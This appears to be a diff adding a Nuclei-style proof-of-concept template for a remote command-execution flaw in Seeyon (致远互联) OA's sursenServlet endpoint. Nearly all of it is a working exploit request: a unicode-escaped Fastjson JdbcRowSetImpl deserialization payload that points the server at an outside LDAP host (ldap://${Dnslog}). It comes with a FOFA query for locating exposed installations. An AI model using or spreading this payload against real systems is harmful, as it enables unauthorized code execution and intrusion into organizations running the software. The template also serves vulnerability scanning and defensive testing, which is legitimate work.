@@ -1,0 +1,22 @@
+id: poc-uw6l0mrut8gryn1k
+info:
+  name: 致远互联OA sursenServlet存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uw6l0mrut8gryn1k'
+  tags: rce,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: uw6l0mrut8gryn1k
+    fofa: app="致远互联-OA"
+http:
+- raw:
+  - 'POST /seeyon/sursenServlet HTTP/1.1
+
+
+    sursenData=%7B%22name%22%3A%7B%22%5Cu0040%5Cu0074%5Cu0079%5Cu0070%5Cu0065%22%3A%22%5Cu006a%5Cu0061%5Cu0076%5Cu0061%5Cu002e%5Cu006c%5Cu0061%5Cu006e%5Cu0067%5Cu002e%5Cu0043%5Cu006c%5Cu0061%5Cu0073%5Cu0073%22%2C%22%5Cu0076%5Cu0061%5Cu006c%22%3A%22%5Cu0063%5Cu006f%5Cu006d%5Cu002e%5Cu0073%5Cu0075%5Cu006e%5Cu002e%5Cu0072%5Cu006f%5Cu0077%5Cu0073%5Cu0065%5Cu0074%5Cu002e%5Cu004a%5Cu0064%5Cu0062%5Cu0063%5Cu0052%5Cu006f%5Cu0077%5Cu0053%5Cu0065%5Cu0074%5Cu0049%5Cu006d%5Cu0070%5Cu006c%22%7D%2C%22x%22%3A%7B%22%5Cu0040%5Cu0074%5Cu0079%5Cu0070%5Cu0065%22%3A%22%5Cu0063%5Cu006f%5Cu006d%5Cu002e%5Cu0073%5Cu0075%5Cu006e%5Cu002e%5Cu0072%5Cu006f%5Cu0077%5Cu0073%5Cu0065%5Cu0074%5Cu002e%5Cu004a%5Cu0064%5Cu0062%5Cu0063%5Cu0052%5Cu006f%5Cu0077%5Cu0053%5Cu0065%5Cu0074%5Cu0049%5Cu006d%5Cu0070%5Cu006c%22%2C%22%5Cu0064%5Cu0061%5Cu0074%5Cu0061%5Cu0053%5Cu006f%5Cu0075%5Cu0072%5Cu0063%5Cu0065%5Cu004e%5Cu0061%5Cu006d%5Cu0065":"ldap://${Dnslog}$","autoCommit":true}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
